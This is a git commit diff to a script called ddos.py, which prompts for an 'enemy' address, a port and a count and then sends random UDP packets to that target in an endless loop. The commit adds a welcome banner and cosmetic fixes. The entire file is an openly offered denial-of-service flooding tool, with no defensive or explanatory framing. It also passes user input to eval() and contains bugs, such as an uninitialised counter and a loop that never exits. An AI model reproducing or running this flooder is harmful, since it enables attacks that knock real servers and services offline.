3196d32ec32b019ca6e7dfe5821310fa0ea75df0
mystic-poop <enesyildiz320@icloud.com>
2025-03-31 19:47:33 +0300

    Update ddos.py
    Added:
    Fixed bugs 
    Welcome screen

--- ddos.py
+++ ddos.py
@@ -2,6 +2,16 @@ import requests
 import os
 import socket
 import random 
+print("""
+**********************
+*     X_X             *
+* Made by Mystic-poop *
+*         Or          *
+*       Xenz          *
+*                     *
+*                     * 
+***********************
+ """)
 print("Write your enemy (with http:// or https://)")
 gonnacooked = input()
 print("which port do you want to explode")
@@ -10,11 +20,11 @@ print("How much nukes need to send ")
 amountofnukes =eval(input())
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-os.system("clear")
+os.system("clear" if os.name == "posix" else "cls")
 while  True:
     sock.sendto(bytes ,(gonnacooked, whichport))
     nukes = nukes +1
-    print ("nuked %s times to %s trought little port:%s "(nukes,gonnacooked,whichport ) )
+    print ("Nuking the server...")
 if nukes > amountofnukes:
     print("Done!")
     input("ress Enter to exit")
